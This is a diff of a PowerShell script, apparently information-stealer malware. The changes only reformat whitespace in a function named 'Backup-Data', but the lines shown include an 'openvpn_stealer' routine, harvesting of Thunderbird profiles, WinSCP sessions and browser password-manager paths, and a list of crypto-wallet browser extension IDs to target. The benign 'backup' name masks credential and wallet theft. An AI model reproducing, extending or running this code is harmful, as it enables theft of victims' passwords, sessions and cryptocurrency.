@@ -622,8 +622,8 @@ function Backup-Data {
         Copy-Item -Path "$openvpnfolder\config.json" -Destination $openvpn_accounts -Recurse -force 
     }
     openvpn_stealer
-	
-	# Thunderbird 
+    
+    # Thunderbird 
     function thunderbirdbackup {
     $thunderbirdfolder = "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles"
     if (!(Test-Path $thunderbirdfolder)) { return }
@@ -771,8 +771,8 @@ function Backup-Data {
     }
     Get-WinSCPSessions
 
-	# Password Managers
-	function password_managers {
+    # Password Managers
+    function password_managers {
     $browserPaths = @{
         "Brave"        = Join-Path $env:LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data"
         "Chrome"       = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data"
@@ -884,8 +884,8 @@ function Backup-Data {
     	"aholpfdialjgjfhomihkjbmgjidlcdno" = "ExodusWeb3"
     	"hpglfhgfnhbgpjdenjgmdgoeiappafln" = "Guarda"
         "dmkamcknogkgcdfhhbddcghachkejeap" = "Keplr"
-		"mcohilncbfahbmgdjkbpemcciiolgcge" = "OKX"
-		"jnmbobjmhlngoefaiojfljckilhhlhcj" = "OneKey"
+        "mcohilncbfahbmgdjkbpemcciiolgcge" = "OKX"
+        "jnmbobjmhlngoefaiojfljckilhhlhcj" = "OneKey"
         "fnjhmkhhmkbjkkabndcnnogagogbneec" = "Ronin"
         "lgmpcpglpngdoalbgeoldeajfclnhafa" = "SafePal"
         "egjidjbpglichdcondbcbdnbeeppgdph" = "Trust Wallet"
@@ -1186,12 +1186,12 @@ function Backup-Data {
         else {
             'False'
         }
-		$passwordmanagers_accounts_info = if (Test-Path $password_managers) {
+        $passwordmanagers_accounts_info = if (Test-Path $password_managers) {
             $passwordmanagers_content = Get-ChildItem -Path $password_managers -Directory | ForEach-Object { $_.Name -replace '\..+$' }
-            if ($passwordmanagers_content) {
-                $passwordmanagers_content -join ' | '
-            }
-            else {
+           if ($passwordmanagers_content) {
+               $passwordmanagers_content -join ' | '
+           }
+           else {
                 'False'
             }
         }
